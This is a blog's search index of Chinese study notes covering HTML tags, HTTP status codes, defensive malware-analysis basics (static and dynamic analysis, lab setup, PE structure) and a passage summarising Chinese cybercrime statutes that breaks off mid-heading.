<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTML</title>
      <link href="/2025/11/30/HTML/"/>
      <url>/2025/11/30/HTML/</url>
      
        <content type="html"><![CDATA[<h1 id="学HTML，一定要"><a href="#学HTML，一定要" class="headerlink" title="学HTML，一定要"></a>学HTML，一定要</h1><p>学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！学会查文档！！！<br><a url="https://www.w3school.com.cn/">领先的 Web 技术教程文档 - 全部免费</a></p><h1 id="标准文档格式"><a href="#标准文档格式" class="headerlink" title="标准文档格式"></a>标准文档格式</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">“UTF-8”/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>我的标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>       //所有东西基本都写在body里面</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h1><p>&#x3D;&#x3D;&lt;a&gt;&#x3D;&#x3D;,&lt;br&gt;(换行),&#x3D;&#x3D;&lt;div&gt;&#x3D;&#x3D;,&lt;h1&gt;-&lt;h6&gt;,&lt;textarea&gt;&#x3D;&#x3D;,&lt;select&gt;&#x3D;&#x3D;,&lt;label&gt;&lt;hr&gt;,&#x3D;&#x3D;&lt;img&gt;,&lt;input&gt;&#x3D;&#x3D;,&lt;p&gt;,&#x3D;&#x3D;&lt;span&gt;,&lt;table&gt;&#x3D;&#x3D;</p><p>注意：以上标签都是应用在body中的</p><h2 id="标签定义超链接"><a href="#标签定义超链接" class="headerlink" title="&lt;a&gt;标签定义超链接"></a>&lt;a&gt;标签定义超链接</h2><p>&lt;a&gt;标签定义<strong>超链接</strong>，用于从一张页面链接到另一张页面<br>&lt;a&gt;元素<strong>最重要的属性是 href 属性</strong>，它指示链接的目标<br>&lt;a href&#x3D;”<a href="http://www.baidu.com/">http://www.baidu.com</a>“ &gt;baidu&lt;&#x2F;a&gt;<br>&lt;a href&#x3D;”<a href="http://www.baidu.com/">http://www.baidu.com</a>“ target&#x3D;” blank”&gt;baidu&lt;&#x2F;a&gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> &gt;</span>baidu\<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>baidu\<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="内容标签（万能标签）"><a href="#内容标签（万能标签）" class="headerlink" title="&lt;div&gt;内容标签（万能标签）"></a>&lt;div&gt;内容标签（万能标签）</h2><p>&lt;div&gt;可定义文档中的分区或节(division&#x2F;section)该元素代表一块区域，内部用于放置其他元素或其他容器<br>&lt;div&gt;标签可以把文档分割为独立的、不同的部分。它可以用作严格的组织工具并且不使用任何格式与其关联<br>最最常用的标签，在功能上可以算是比较万能标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#00FF00&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>This is a header<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a paragraph.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="图像"><a href="#图像" class="headerlink" title="&lt;img&gt;图像"></a>&lt;img&gt;图像</h2><p>单标签<br>&lt;img&gt;元素向网页中嵌入一幅图像，图像文件存放在html文件同一目录<br>&lt;img&gt;标签有两个必需的属性:src 属性 和 alt 属性，alt属性的用处是当图片显示不了的时候用文字去代替</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;a.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;你好&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&lt;input&gt;"></a>&lt;input&gt;</h2><p>&lt;input&gt;标签用于搜集用户信息(输入信息)根据不同的 type 属性值，<strong>输入字段</strong>拥有很<strong>多种形式</strong>，输入字段可以是文本字段、复选框、掩码后的文本控件、单选按钮、按钮等等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="表格"><a href="#表格" class="headerlink" title="&lt;table&gt;表格"></a>&lt;table&gt;表格</h2><p>&lt;table&gt; 标签定义 HTML <strong>表格</strong><br>&lt;tr&gt;（行）,&lt;td&gt;（数据）,&lt;th&gt;是它子元素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>Month<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>Savings<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>January<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>$100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="元素分类"><a href="#元素分类" class="headerlink" title="元素分类"></a>元素分类</h1><p>可以分为三大类:块级元素，内联元素，内联块级元素</p><ul><li>块级元素<ul><li>每个块级元素都从新的一行开始，并且其后的元素也另起一行。块级元素<strong>独占一行</strong>)</li><li>元素的高度(height)，宽度(width)，行高(line-height)以及顶和底边距(margin,padding)都可设置</li><li>元素宽度在不设置的情况下，是它本身父容器的100%(和父元素的宽度一致)常用的块元素有:&lt;div&gt;,&lt;p&gt;,&lt;h1&gt;…&lt;h6&gt;,&lt;ul&gt;,&lt;ol&gt;,&lt;d&gt;,&lt;table&gt;,&lt;address&gt;,&lt;blockquote&gt;,&lt;form&gt;设置display:block，可以将元素转换块级元素</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP状态码备忘</title>
      <link href="/2025/11/28/HTTP/"/>
      <url>/2025/11/28/HTTP/</url>
      
        <content type="html"><![CDATA[<p>HTTP 返回状态码是服务器对客户端请求的三位数字响应标识，依据首位数字分为五大类，分别对应信息提示、请求成功、重定向、客户端错误和服务器错误，以下是各类常见状态码的详细解析：</p><ol><li><p><strong>1xx（信息性状态码）</strong></p><p> 这类状态码较少被用户感知，主要用于告知客户端请求已被接收，需继续后续操作。</p><ul><li><strong>100 Continue</strong>：客户端发送大文件等请求前，服务器先确认可接收，示意客户端继续发送剩余请求内容。</li><li><strong>101 Switching Protocols</strong>：服务器同意按客户端请求切换通信协议，比如从 HTTP 协议升级为 WebSocket 协议以实现实时通信。</li></ul></li><li><p><strong>2xx（成功状态码）</strong></p><p> 代表客户端的请求被服务器成功接收、理解并处理，是请求交互中的理想结果。</p><ul><li><strong>200 OK</strong>：最常用的成功状态码，比如浏览器正常加载网页、调用 API 成功获取数据时，服务器都会返回该状态码。</li><li><strong>201 Created</strong>：请求成功且服务器新建了资源，常见于提交表单创建账号、上传文件生成新存储资源等场景，响应中通常会附带新资源的访问地址。</li><li><strong>204 No Content</strong>：请求成功执行，但响应体无任何内容，比如调用删除接口成功删除数据后，服务器仅返回结果确认，无需返回数据。</li><li><strong>206 Partial Content</strong>：用于分块下载或断点续传场景，客户端请求资源的部分内容时，服务器仅返回对应范围的内容，比如拖动视频进度条加载指定片段。</li></ul></li><li><p><strong>3xx（重定向状态码）</strong></p><p> 表示客户端需通过进一步的跳转操作，才能完成原本的请求，常涉及 URL 地址的切换。</p><ul><li><strong>301 Moved Permanently</strong>：资源已永久迁移到新 URL，比如网站更换域名后，旧域名访问会触发该状态码，搜索引擎也会更新索引指向新地址。</li><li><strong>302 Found</strong>：资源临时重定向到新 URL，比如网站临时维护时，将用户跳转至维护公告页，后续资源恢复后仍需使用原 URL 访问。</li><li><strong>304 Not Modified</strong>：客户端缓存的资源未更新，服务器无需重复返回完整内容，比如浏览器再次访问网页时，若网页未修改，服务器返回该状态码，浏览器直接使用本地缓存。</li><li><strong>307 Temporary Redirect</strong>：临时重定向，且会保留客户端原请求方法，比如客户端用 POST 方式提交数据触发重定向后，仍以 POST 方式访问新地址。</li></ul></li><li><p><strong>4xx（客户端错误状态码）</strong></p><p> 问题出在客户端请求本身，比如格式错误、权限不足等，导致服务器无法正常处理请求。</p><ul><li><strong>400 Bad Request</strong>：请求存在语法错误或无效参数，比如 JSON 格式错误、必填参数缺失等。</li><li><strong>401 Unauthorized</strong>：请求需身份验证，比如未登录就访问需要登录的页面，或 API 调用缺少有效 Token。</li><li><strong>403 Forbidden</strong>：服务器理解请求，但因客户端权限不足拒绝执行，比如普通用户尝试访问管理员后台。</li><li><strong>404 Not Found</strong>：最常见的错误状态码，服务器找不到请求的资源，多因 URL 拼写错误或资源已被删除。</li><li><strong>429 Too Many Requests</strong>：客户端请求过于频繁，触发服务器限流策略，比如短时间内多次调用同一 API 超出限制。</li></ul></li><li><p><strong>5xx（服务器错误状态码）</strong></p><p> 客户端请求本身无问题，但服务器在处理请求过程中发生内部错误，导致请求失败。</p><ul><li><strong>500 Internal Server Error</strong>：通用服务器内部错误，比如代码出现异常、数据库连接失败等，具体原因需查看服务器日志排查。</li><li><strong>502 Bad Gateway</strong>：多出现于代理服务器场景，比如 Nginx 作为代理时，从后端应用服务器收到无效响应。</li><li><strong>503 Service Unavailable</strong>：服务器暂时无法处理请求，常见原因是服务器过载、正在停机维护，通常会提示用户稍后重试。</li><li><strong>504 Gateway Timeout</strong>：代理服务器等待上游服务器响应超时，比如后端服务处理请求过慢，导致代理服务器未及时收到结果。</li></ul></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>善意代码</title>
      <link href="/2025/09/10/%E5%96%84%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
      <url>/2025/09/10/%E5%96%84%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><h2 id="恶意代码分析目标"><a href="#恶意代码分析目标" class="headerlink" title="恶意代码分析目标"></a>恶意代码分析目标</h2><ul><li>通常是为一起<strong>网络入侵事件</strong>的响应提供所需信息<ul><li>确定某一个特定的可疑程序所完成的功能，在网络上检测出它的方法，衡量并消除它所带来的损耗</li></ul></li><li>更进一步，针对需要分析的文件或网络，编写相应的检测<strong>特征码</strong>，来检测文件或网络是否感染<ul><li>基于<strong>主机</strong>的检测特征码<ul><li>感染迹象</li><li>这些迹象通常是恶意代码对文件&#x2F;注册表等的修改</li><li>用于在受感染主机上检测出恶意代码及其所感染的文件等</li></ul></li><li>基于<strong>网络</strong>的检测特征码<ul><li>通过检测网络流量来检测恶意代码</li><li>可以在没有进行恶意代码分析时创建，但在恶意代码分析帮助下提取的特征码通常更加有效</li></ul></li></ul></li></ul><h2 id="恶意代码分析技术"><a href="#恶意代码分析技术" class="headerlink" title="恶意代码分析技术"></a>恶意代码分析技术</h2><p>大多数时候进行恶意代码分析时只有恶意代码的可执行文件本身- <strong>PE文件</strong></p><h3 id="静态分析技术"><a href="#静态分析技术" class="headerlink" title="静态分析技术"></a>静态分析技术</h3><p>在不运行恶意代码的情况下借助工具分析恶意代码的静态特征和功能模块</p><h4 id="静态分析基础技术"><a href="#静态分析基础技术" class="headerlink" title="静态分析基础技术"></a>静态分析基础技术</h4><p>检查可执行文件但不看具体指令<br>可以确定一个文件是否是恶意的，提供有关其功能的信息，提供一些能够生成简单的网络特征码</p><h5 id="静态分析基础工具－PEVIEW"><a href="#静态分析基础工具－PEVIEW" class="headerlink" title="静态分析基础工具－PEVIEW"></a>静态分析基础工具－PEVIEW</h5><p>查看PE文件内容，分析其头部</p><h4 id="静态分析高级技术"><a href="#静态分析高级技术" class="headerlink" title="静态分析高级技术"></a>静态分析高级技术</h4><p>对恶意代码内部机制的逆向工程<br>该方法考虑构成恶意代码的指令和含义，通过理解指令语义建立恶意代码的流程图和功能框架，进一步分析恶意代码的功能结构</p><h5 id="静态分析工具－IDA-Pro"><a href="#静态分析工具－IDA-Pro" class="headerlink" title="静态分析工具－IDA Pro"></a>静态分析工具－IDA Pro</h5><p>（）</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul><li>恶意代码没有动态执行，不会对系统造成破坏</li><li>静态分析可以对文件执行的代码流程有全局掌握</li><li>不受具体进程执行流程的制约，可以对代码进行详尽的细粒度分析</li></ul><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul><li>由于静态分析本身的局限性，分析内容不全面</li><li>绝大多数静态分析技术只能识别出一致的病毒或恶意代码，对才用了编码的多态变种或加壳压缩处理的程序则无能为力</li></ul><h3 id="动态分析技术"><a href="#动态分析技术" class="headerlink" title="动态分析技术"></a>动态分析技术</h3><p>监视恶意代码运行过程来了解恶意代码功能</p><h4 id="动态分析基础技术"><a href="#动态分析基础技术" class="headerlink" title="动态分析基础技术"></a>动态分析基础技术</h4><ul><li>运行恶意代码病观察系统上的行为、系统环境的变化来判断恶意代码功能</li><li>通过观察恶意代码运行过程中系统文件、配置和注册表变化来分析恶意代码的自启动实现方法和进程隐藏方法；通过观察恶意代码运行过程中的网络活动情况来了解恶意代码的网络功能</li><li>易于使用，但并非对所有恶意代码都有效，也可能错过一些重要功能</li></ul><h4 id="动态分析高级技术"><a href="#动态分析高级技术" class="headerlink" title="动态分析高级技术"></a>动态分析高级技术</h4><ul><li>通过跟踪恶意代码执行过程使用的系统函数和指令特征来分析恶意代码功能</li><li>使用<strong>调试器</strong>来检查一个恶意可执行程序运行时刻的内部状态</li><li>能够全面监视执行过程，但过程耗时</li></ul><h2 id="常用分析工具"><a href="#常用分析工具" class="headerlink" title="常用分析工具"></a>常用分析工具</h2><h3 id="虚拟执行环境"><a href="#虚拟执行环境" class="headerlink" title="虚拟执行环境"></a>虚拟执行环境</h3><p>VMWare、沙箱</p><h3 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h3><p>IDA Pro、PE文件格式处理工具</p><h3 id="动态分析工具"><a href="#动态分析工具" class="headerlink" title="动态分析工具"></a>动态分析工具</h3><p>动态调试工具（OllyDbg）<br>外部检测工具</p><h2 id="分析通用规则"><a href="#分析通用规则" class="headerlink" title="分析通用规则"></a>分析通用规则</h2><ul><li>不要过于陷入细节，关注最关键的功能</li><li>注意多中工具灵活配合使用</li></ul><h1 id="虚拟网络环境搭建"><a href="#虚拟网络环境搭建" class="headerlink" title="虚拟网络环境搭建"></a>虚拟网络环境搭建</h1><h2 id="虚拟机和Docker"><a href="#虚拟机和Docker" class="headerlink" title="虚拟机和Docker"></a>虚拟机和Docker</h2><ul><li>虚拟机：虚拟硬件，然后在虚拟硬件上装操作系统，再在操作系统上装程序</li><li>Docker：把环境变量，软件的环境打包（不符合我们需求）</li></ul><h2 id="恶意代码分析网络环境"><a href="#恶意代码分析网络环境" class="headerlink" title="恶意代码分析网络环境"></a>恶意代码分析网络环境</h2><p>一个分析机与一个服务机相连，与物理机隔开<br>服务机：web服务、DNS服务、SMTP服务（kali-INetSim）</p><h3 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h3><h4 id="1-Host-Only"><a href="#1-Host-Only" class="headerlink" title="1. Host-Only"></a>1. Host-Only</h4><h4 id="2-LAN区段手动设置IP"><a href="#2-LAN区段手动设置IP" class="headerlink" title="2. LAN区段手动设置IP"></a>2. LAN区段手动设置IP</h4><p>配置静态IP，把两个机器配成一个网段</p><h2 id="VM的典型功能"><a href="#VM的典型功能" class="headerlink" title="VM的典型功能"></a>VM的典型功能</h2><ul><li>VMWare Tools</li><li>共享文件夹</li><li>快照</li><li>导入&#x2F;导出</li></ul><h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><h2 id="PE含义"><a href="#PE含义" class="headerlink" title="PE含义"></a>PE含义</h2><p>Portable Executable File Format</p><ul><li>设计目标：可在不同CPU上运行</li><li>从第一个NT操作系统诞生，操作系统变化巨大，但对PE的格式影响并不大</li><li>PE文件有较好的数据组织方式和数据管理算法，PE文件的数据组织是大量的字节码与数据结构的有机融合</li></ul><h2 id="PE文件加载"><a href="#PE文件加载" class="headerlink" title="PE文件加载"></a>PE文件加载</h2><ul><li><strong>所有头部和节表信息加载</strong>：<ul><li>根据PE文件头中的IMAGEBASE信息将PE文件头 和节表按照SizeOfHeader大小，依据 SectionAlignment对齐后加载到相应内存</li></ul></li><li><strong>各节加载</strong>：<ul><li><strong>获取节的个数</strong>：读取PE文件头中的<strong>NumberOfSections</strong>字段数值</li><li><strong>定位节表起始位置</strong>：PE文件头的起始偏移量加上PE文件头的总大小（PE 文件头大小18h+PE文件扩展头大小<strong>SizeOfOptionalHeader</strong>）</li><li><strong>循环读取并处理节表中的各个节信息</strong><ul><li>读取节表结构中的<strong>PointerToRawData</strong>数据，定位到该节在文件中的<strong>起始位置</strong></li><li>读取<strong>SizeOfRawData</strong>数据，计算该节<strong>所占据的字节数X</strong></li><li>将本节的<strong>VirtualAddress</strong>地址数据<strong>加上</strong>PE文件头中的<strong>ImageBase数据</strong>，得到本节在虚拟内存中的<strong>起始地址VA</strong></li><li>按照该地址VA，将本节映射到内存该处开始占据的X个字节数并按照<strong>SectionAlignment</strong>对齐</li><li>按照<strong>Characteristics</strong>数据设置本节的访问标志</li></ul></li></ul></li></ul><h2 id="PE文件结构-1"><a href="#PE文件结构-1" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><p>PE文件把所有代码和数据都合并在一起，组成了一个大而复杂的数据结构</p><h3 id="基本结构介绍"><a href="#基本结构介绍" class="headerlink" title="基本结构介绍"></a>基本结构介绍</h3><ul><li>由四部分组成：<ol><li>DOS部分：（用处不大）<ol><li>MZ文件头<br> 占PE文件最开始的64字节<br> 最重要的两个字段：<ol><li>MZ标志字段：偏移量0000，占2字节，4D5Ah</li><li>e_Ifanew标志字段</li></ol></li><li>可执行代码DOS块（DOS tub）</li></ol></li><li>PE文件头：<ol><li>PE文件头标志（PE\0\0）</li><li>PE文件表头</li><li>数据目录表</li></ol></li><li>节表：节数据的索引<br> ![[Pasted image 20251009081725.png]]<br> 寻找文件位置关注virtualaddress与poingtertorawdata</li><li>节数据</li></ol></li></ul><h4 id="节"><a href="#节" class="headerlink" title="节"></a>节</h4><p>典型地拥有9个预定义节：.text、.bss、.rdata、.data、.rsrc、 .edata、 .idata、 .pdata和.debug</p><ul><li>可执行代码节：.text</li><li>数据节：.bss、.rdata、.data（现在基本上.bss和.data合并了，然后可写的放在.data中，只读的放在.rdata里）</li><li>资源节：.rsrc（可视化图形界面）</li><li><strong>导出函数节：.edata</strong><ul><li>从其它DLL中引入的函数</li><li>该节开始为IMAGE_IMPORT_DESCRIPTOR结构的结构数组，即导入表，数据目录表表项结构成员VirtualAddress包含导入表地址</li><li>当PE装载器执行一个程序，它将相关DLL都装入该进程的地址空间，然后根据主程序的导入函数信息，查找相关DLL中的真实函数地址来修正主程序</li><li>导入函数节可能被病毒用来直接获取API函数地址</li></ul></li><li><strong>导入函数节：.idata</strong></li></ul><h3 id="导入表的分析"><a href="#导入表的分析" class="headerlink" title="导入表的分析"></a>导入表的分析</h3><h3 id="导出表的分析"><a href="#导出表的分析" class="headerlink" title="导出表的分析"></a>导出表的分析</h3><h1 id="静态分析和动态分析基础"><a href="#静态分析和动态分析基础" class="headerlink" title="静态分析和动态分析基础"></a>静态分析和动态分析基础</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网安民警管辖的12种罪名</title>
      <link href="/2025/06/28/%E7%BD%91%E5%AE%89%E6%B0%91%E8%AD%A6%E7%AE%A1%E8%BE%96%E7%9A%8412%E7%A7%8D%E7%BD%AA%E5%90%8D/"/>
      <url>/2025/06/28/%E7%BD%91%E5%AE%89%E6%B0%91%E8%AD%A6%E7%AE%A1%E8%BE%96%E7%9A%8412%E7%A7%8D%E7%BD%AA%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="《刑法》分则第四章侵犯公民人身权利、民主权利罪相关案件"><a href="#《刑法》分则第四章侵犯公民人身权利、民主权利罪相关案件" class="headerlink" title="《刑法》分则第四章侵犯公民人身权利、民主权利罪相关案件"></a>《刑法》分则第四章侵犯公民人身权利、民主权利罪相关案件</h3><h4 id="1-侵犯公民个人信息案（第253条之一）"><a href="#1-侵犯公民个人信息案（第253条之一）" class="headerlink" title="1. 侵犯公民个人信息案（第253条之一）"></a>1. 侵犯公民个人信息案（第253条之一）</h4><ul><li><strong>详细内容</strong>：违反国家有关规定，向他人出售或者提供公民个人信息，情节严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：公民个人信息安全和身份信息管理秩序。</li><li><strong>客观方面</strong>：违反国家规定，出售或提供公民个人信息，情节严重。</li><li><strong>主体</strong>：一般主体，包括自然人和单位。</li><li><strong>主观方面</strong>：故意，包括直接故意和间接故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>出售或提供行踪轨迹、通信内容、征信信息、财产信息50条以上。</li><li>违法所得5000元以上。</li><li>曾因侵犯公民个人信息受过刑事处罚或二年内受过行政处罚，又非法获取、出售或提供公民个人信息。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。</li><li>情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>情节严重包括出售或提供高危信息50条以上，普通信息500条以上，违法所得5000元以上等。</li><li>情节特别严重包括造成被害人死亡、重伤、精神失常等严重后果，或造成重大经济损失、恶劣社会影响等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与侵犯隐私权不同，侵犯公民个人信息罪侵犯的是公民个人信息安全，而侵犯隐私权侵犯的是公民的隐私权。</li></ul></li></ul><h4 id="2-侵害英雄烈士名誉、荣誉案（刑法299条之一，修正案（十一）第35条）"><a href="#2-侵害英雄烈士名誉、荣誉案（刑法299条之一，修正案（十一）第35条）" class="headerlink" title="2. 侵害英雄烈士名誉、荣誉案（刑法299条之一，修正案（十一）第35条）"></a>2. 侵害英雄烈士名誉、荣誉案（刑法299条之一，修正案（十一）第35条）</h4><ul><li><strong>详细内容</strong>：侮辱、诽谤或者以其他方式侵害英雄烈士的名誉、荣誉，损害社会公共利益，情节严重的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：英雄烈士的名誉、荣誉和社会公共利益。</li><li><strong>客观方面</strong>：实施侮辱、诽谤或以其他方式侵害英雄烈士名誉、荣誉的行为。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>情节严重，如多次侮辱、诽谤或造成恶劣社会影响等。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>情节严重的，处三年以下有期徒刑、拘役、管制或者剥夺政治权利。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>通过网络、媒体等公开方式侮辱、诽谤英雄烈士。</li><li>组织、指使他人侮辱、诽谤英雄烈士。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与普通名誉权侵权不同，本罪保护对象为英雄烈士的名誉、荣誉，且强调损害社会公共利益的情节。</li></ul></li></ul><h3 id="《刑法》分则第六章第一节扰乱公共秩序罪相关案件"><a href="#《刑法》分则第六章第一节扰乱公共秩序罪相关案件" class="headerlink" title="《刑法》分则第六章第一节扰乱公共秩序罪相关案件"></a>《刑法》分则第六章第一节扰乱公共秩序罪相关案件</h3><h4 id="1-组织考试作弊案（第284条之一第1款）"><a href="#1-组织考试作弊案（第284条之一第1款）" class="headerlink" title="1. 组织考试作弊案（第284条之一第1款）"></a>1. 组织考试作弊案（第284条之一第1款）</h4><ul><li><strong>详细内容</strong>：在法律规定的国家考试中，组织作弊的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家公平、公正的考试制度。</li><li><strong>客观方面</strong>：在法律规定的国家考试中，组织作弊或为他人实施作弊提供帮助。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意。</li></ul></li><li><strong>立案标准</strong>：<ul><li>在法律规定的国家考试中，组织作弊的行为。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>处三年以下有期徒刑或者拘役，并处或者单处罚金。</li><li>情节严重的，处三年以上七年以下有期徒刑，并处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>情节严重包括在普通高等学校招生考试、研究生招生考试、公务员录用考试中组织作弊，导致考试推迟、取消或启用备用试题等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与非法出售、提供试题、答案罪不同，本罪强调组织作弊的行为，而非法出售、提供试题、答案罪强调提供试题、答案的行为。</li></ul></li></ul><h4 id="2-非法出售、提供试题、答案案（第284条之一第3款）"><a href="#2-非法出售、提供试题、答案案（第284条之一第3款）" class="headerlink" title="2. 非法出售、提供试题、答案案（第284条之一第3款）"></a>2. 非法出售、提供试题、答案案（第284条之一第3款）</h4><ul><li><strong>详细内容</strong>：为实施考试作弊行为，向他人非法出售或提供法律规定的国家考试的试题、答案的行为。</li><li><strong>构成要件</strong>：<ul><li><strong>客体</strong>：国家对考试组织的管理秩序和他人公平参与考试的权利。</li><li><strong>客观方面</strong>：向他人非法出售或提供试题、答案。</li><li><strong>主体</strong>：一般主体。</li><li><strong>主观方面</strong>：故意，目的是实施考试作弊行为。</li></ul></li><li><strong>立案标准</strong>：<ul><li>实施非法出售或提供试题、答案的行为。</li></ul></li><li><strong>量刑标准</strong>：<ul><li>处三年以下有期徒刑或者拘役，并处或者单处罚金。</li><li>情节严重的，处三年以上七年以下有期徒刑，并处罚金。</li></ul></li><li><strong>犯罪情形认定</strong>：<ul><li>情节严重包括涉及高考、研考等重大考试，导致考试延期或启用备用试题等。</li></ul></li><li><strong>与其他条款区别</strong>：<ul><li>与故意泄露国家秘密罪不同，本罪强调为实施考试作弊行为而提供试题、答案，而故意泄露国家秘密罪强调泄露国家秘密的行为。</li></ul></li></ul><h4 id="3-非法侵入计算机信息系统案（第285条第1款）"><a href="#3-非法侵入计算机信息系统案（第285条第1款）" class="headerlink" title="&#x3D;&#x3D;3. 非法侵入计算机信息系统案（第285条第1款）&#x3D;&#x3D;"></a>&#x3D;&#x3D;3. 